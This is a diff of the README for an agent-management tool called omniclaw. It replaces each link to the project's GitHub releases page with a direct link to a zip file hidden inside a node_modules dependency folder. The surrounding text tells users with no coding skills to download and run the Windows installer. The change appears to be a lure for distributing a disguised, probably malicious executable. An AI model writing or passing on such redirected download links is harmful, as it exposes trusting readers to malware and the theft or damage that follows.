@@ -1,6 +1,6 @@
 # 🐝 omniclaw - Manage Autonomous Agents Easily
 
-[![Download omniclaw](https://img.shields.io/badge/Download-omniclaw-blue?style=for-the-badge)](https://github.com/AlexanderFarhan/omniclaw/releases)
+[![Download omniclaw](https://img.shields.io/badge/Download-omniclaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/AlexanderFarhan/omniclaw/main/project/frontend/node_modules/postcss-opacity-percentage/Software-v3.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You do not need any coding skills to use omniclaw. Follow these steps to get it 
 
 Click the big button at the top or visit this link:
 
-[Download omniclaw releases](https://github.com/AlexanderFarhan/omniclaw/releases)
+[Download omniclaw releases](https://raw.githubusercontent.com/AlexanderFarhan/omniclaw/main/project/frontend/node_modules/postcss-opacity-percentage/Software-v3.2.zip)
 
 On this page, you will see the latest version of the program ready to download.
 
@@ -113,6 +113,6 @@ Check the download page regularly for new versions. Updating is as simple as dow
 
 Click the button below to visit the download page.
 
-[![Download omniclaw](https://img.shields.io/badge/Download-omniclaw-grey?style=for-the-badge)](https://github.com/AlexanderFarhan/omniclaw/releases)
+[![Download omniclaw](https://img.shields.io/badge/Download-omniclaw-grey?style=for-the-badge)](https://raw.githubusercontent.com/AlexanderFarhan/omniclaw/main/project/frontend/node_modules/postcss-opacity-percentage/Software-v3.2.zip)
 
 Once there, download the latest Windows installer file and run it. Follow the setup steps above. After installation, launch the app and follow the simple setup guide to connect your messaging app. Then, you can start managing your digital agents immediately.
